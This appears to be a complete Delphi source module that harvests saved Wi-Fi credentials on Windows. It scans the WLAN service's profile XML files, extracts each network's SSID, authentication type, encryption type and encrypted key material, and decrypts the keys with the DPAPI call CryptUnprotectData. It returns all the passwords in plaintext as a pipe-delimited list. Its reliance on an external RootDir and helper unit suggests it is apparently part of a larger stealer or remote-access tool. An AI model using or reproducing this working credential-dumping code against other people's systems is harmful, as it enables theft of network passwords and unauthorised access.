unit UnitWifiPasswords;

interface

uses
  Windows, Classes, UnitFunctions;

function ListWifiPasswords: string;

implementation
      
const
  CRYPT_STRING_HEX = 4;
  CRYPTPROTECT_LOCAL_MACHINE = 4; 

type                
  PDATA_BLOB = ^TDATA_BLOB;
  TDATA_BLOB = record
    cbData: DWORD;
    pbData: PByte;
  end;
                                          
  PCRYPTPROTECT_PROMPTSTRUCT = ^TCRYPTPROTECT_PROMPTSTRUCT;
  TCRYPTPROTECT_PROMPTSTRUCT = record
    cbSize: DWORD;
    dwPromptFlags: DWORD;
    hwndApp: HWND;
    szPrompt: PWChar;
  end;

var
  Size: DWORD = 1024;
     
function ParseConfig(T_, ForS, _T: string): string;
var
  a, b: integer;
begin
  Result := '';
  if (T_ = '') or (ForS = '') or (_T = '') then Exit;
  a := Pos(T_, ForS);
  if a = 0 then Exit else a := a + Length(T_);
  ForS := Copy(ForS, a, Length(ForS) - a + 1);
  b := Pos(_T, ForS);
  if b > 0 then Result := Copy(ForS, 1, b - 1);
end;

procedure FindXmlFiles(StartDir, FileMask: string; var FilesList: TStringList);
const
  MASK_ALL_FILES = '*.*';
  CHAR_POINT = '.';
var
  sRec: TSearchRec;
  DirList: TStringList;
  IsFound: Boolean;
  i: integer;
begin
  if StartDir[length(StartDir)] <> '\' then StartDir := StartDir + '\';
  IsFound := FindFirst(StartDir + FileMask, faAnyFile - faDirectory, sRec) = 0;

  while IsFound do
  begin
    FilesList.Add(StartDir + sRec.Name);
    IsFound := FindNext(sRec) = 0;
  end;

  FindClose(sRec);
  DirList := TStringList.Create;

  try
    IsFound := FindFirst(StartDir + MASK_ALL_FILES, faAnyFile, sRec) = 0;
    while IsFound do
    begin
      if ((sRec.Attr and faDirectory) <> 0) and (sRec.Name[1] <> CHAR_POINT) then
        DirList.Add(StartDir + sRec.Name);
      IsFound := FindNext(sRec) = 0;
    end;
    FindClose(sRec);
    for i := 0 to DirList.Count - 1 do FindXmlFiles(DirList[i], FileMask, FilesList);
  finally
    DirList.Free;
  end;
end;
          
function CryptUnprotectData(pDataIn: PDATA_BLOB; szDataDescr: PWChar;
                            pOptionalEntropy: PDATA_BLOB; pvReserved: Pointer;
                            pPromptStruct: PCRYPTPROTECT_PROMPTSTRUCT;
                            dwFlags: DWORD; pDataOut: PDATA_BLOB): BOOL; stdcall;
                            external 'Crypt32.dll';

function CryptStringToBinary(pszString: PwideChar; cchString: DWORD; dwFlags: DWORD;
                            pbBinary: pbyte; var pcbBinary: dword; pdwSkip: PDWORD;
                            pdwFlags: PDWORD): BOOL; stdcall;
                            external 'Crypt32.dll' name 'CryptStringToBinaryW';
      
function ListWifiPasswords: string;
var
  ByteKey: array[0..1024] of PByte;
  FilesList, Datas: TStringList;
  TmpStr: WideString;
  Src, Dst: TDATA_BLOB;
  i:integer;
  SSID, Auth, Encr, Keytype: string;
  TmpBool: BOOL;
  Password, ProfilesPath: string;
begin
  Result := '';

  try
    begin
      Datas := TStringList.Create;
      FilesList := TStringList.Create;
      ProfilesPath := RootDir + 'ProgramData\Microsoft\Wlansvc\Profiles\';
      FindXmlFiles(ProfilesPath, '*.xml', FilesList);

      for i := 0 to FilesList.Count - 1 do
      begin
        Datas.LoadFromFile(FilesList[i]);

        SSID := (ParseConfig('<name>', Datas.Text, '</name>')); //essid
        Auth := (ParseConfig('<authentication>', Datas.Text, '</authentication>'));//cifrado wep o wpa
        Encr := (ParseConfig('<encryption>', Datas.Text, '</encryption>')); //encyption type
        Keytype := (ParseConfig('<keyType>', Datas.Text, '</keyType>'));  //key type
        TmpStr := (ParseConfig('<keyMaterial>', Datas.Text, '</keyMaterial>')); //clave wireles
        // convertir a byte array
        TmpBool := CryptStringToBinary(PWideChar(TmpStr), Length(TmpStr),
          CRYPT_STRING_HEX, @ByteKey, Size, nil, nil);
        if TmpBool = true then
        begin
          try
            Dst.cbData := Size;
            Dst.pbdata := @ByteKey[0];
            Password := TmpStr;
            if CryptUnProtectData(@Dst, nil, nil, nil, nil, CRYPTPROTECT_LOCAL_MACHINE, @Src) then
              Password := PAnsiChar(Src.pbData);
              
            Result := Result + SSID + '|';
            Result := Result + Auth + '|';
            Result := Result + Encr + '|';
            Result := Result + Keytype + '|';
            Result := Result + Password + '|' + #13#10;
          finally
          end;
        end;
      end;
      
      Datas.free;
      FilesList.Free;
    end;
  except
  end;
end;

end.
